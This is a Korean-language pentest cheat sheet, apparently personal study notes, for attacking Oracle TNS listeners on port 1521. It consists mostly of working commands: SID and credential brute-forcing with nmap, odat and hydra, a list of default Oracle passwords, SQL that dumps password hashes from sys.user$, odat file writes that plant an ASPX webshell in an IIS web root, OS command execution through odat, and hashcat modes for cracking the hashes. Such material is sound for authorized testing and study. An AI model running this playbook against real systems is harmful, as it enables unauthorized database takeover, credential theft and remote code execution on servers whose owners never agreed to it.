# Oracle TNS

# Oracle TNS (1521)

Oracle 데이터베이스의 네트워크 접속 계층. TNS Listener(기본 1521)가 접속 요청을 받아 DB 인스턴스로 넘긴다. 접속하려면 인스턴스를 가리키는 SID 또는 Service Name 을 알아야 해서, 공격은 보통 SID 열거부터 시작한다. 기본 자격증명과 odat 를 통한 파일 읽기/쓰기, OS 명령 실행이 주요 벡터.

---

## 1. 열거

TNS 는 인증 없이도 버전과 상태를 어느 정도 뱉는다. SID 를 모르면 접속 자체가 안 되므로, 버전 확인과 SID 브루트포스를 먼저 한다.

```bash
# odat 다운로드
sudo apt install odat -y

# nmap - 버전과 SID
nmap -p 1521 -sV --open <IP>
nmap -p 1521 --script=oracle-tns-version <IP>
nmap -p 1521 --script=oracle-sid-brute <IP>

# odat - 종합 스캔 (SID, 버전, 알려진 취약점 자동 점검)
odat all -s <IP>
odat all -s <IP> -p 1521
```

---

## 2. SID 브루트포스

접속에 쓸 SID 를 모를 때 사전으로 때려본다. XE(Oracle Express 기본), ORCL, PROD 등이 흔하다.

```bash
# odat sidguesser
odat sidguesser -s <IP> -p 1521

# nmap
nmap -p 1521 --script=oracle-sid-brute <IP>

# hydra (sid 사전 직접 지정)
hydra -L /usr/share/wordlists/sids.txt -s 1521 <IP> oracle-sid
```

---

## 3. 자격증명 브루트포스

SID 를 찾으면 그 SID 대상으로 계정을 때린다. Oracle 은 기본 계정이 많이 알려져 있다.

```bash
# odat passwordguesser (SID 지정)
odat passwordguesser -s <IP> -p 1521 -d <SID>
odat passwordguesser -s <IP> -p 1521 -d <SID> --accounts-file accounts.txt

# 자주 먹히는 기본 계정
#   scott/tiger
#   system/manager
#   sys/change_on_install
#   dbsnmp/dbsnmp
#   system/oracle
```

---

## 4. 접속

sqlplus 로 붙는다. 형식은 `<user>/<password>@<IP>:1521/<SID>` 다. sys 계정은 `as sysdba` 를 붙여야 한다.

```bash
# 일반 접속
sqlplus <user>/<password>@<IP>:1521/<SID>

# sysdba 로 접속 (sys 계정 등 최고 권한)
sqlplus <user>/<password>@<IP>:1521/<SID> as sysdba

# 자주 보는 에러
#   ORA-12514 : SID/Service Name 이 틀림 (리스너가 그 인스턴스를 모름)
#   ORA-01017 : 사용자명/비밀번호 틀림
```

---

## 5. 접속 후 정찰

```sql
-- 버전
SELECT version FROM v$instance;
SELECT banner FROM v$version;

-- 현재 사용자 / DBA 권한 여부
SELECT user FROM dual;
SELECT * FROM user_role_privs;          -- DBA 롤 있으면 사실상 장악
SELECT * FROM session_privs;

-- 계정과 비밀번호 해시 (DBA 권한 필요)
SELECT name, password FROM sys.user$;
SELECT name, spare4 FROM sys.user$;     -- 11g+ SHA 해시

-- 테이블 둘러보기
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM');
```

---

## 6. 파일 읽기/쓰기 (odat)

DBA 권한이 있으면 odat 로 서버 파일 시스템에 접근한다. Windows 타겟이면 웹 루트에 웹셸을 써서 RCE 로 잇는 게 고전 경로다.

```bash
# 파일 읽기
odat utlfile -s <IP> -d <SID> -U <user> -P <password> --sysdba --getFile <remote_dir> <remote_file> <local_out>

# 파일 쓰기 (예: IIS 웹 루트에 웹셸)
odat utlfile -s <IP> -d <SID> -U <user> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx

# 쓴 뒤 브라우저나 curl 로 웹셸 호출
```

---

## 7. OS 명령 실행 (odat)

```bash
# 외부 테이블 / 스케줄러 / 자바 경로로 명령 실행 시도
odat externaltable -s <IP> -d <SID> -U <user> -P <password> --sysdba --exec C:\\Windows\\System32 "whoami"
odat dbmsscheduler -s <IP> -d <SID> -U <user> -P <password> --sysdba --exec "cmd /c whoami"
```

---

## 팁

- SID 를 못 구하면 그 어떤 자격증명도 못 쓴다. 열거 1순위는 SID 다
- 기본 계정(scott/tiger, system/manager)이 실전과 연습 모두에서 자주 살아 있다
- DBA 롤이 보이면 odat utlfile 로 웹셸을 써서 바로 RCE 로 넘어가는 게 Windows 타겟의 흔한 경로다
- 해시를 뽑으면 hashcat 으로 크랙한다 (Oracle 11g+ 는 모드 112, 구형 DES 는 모드 3100)
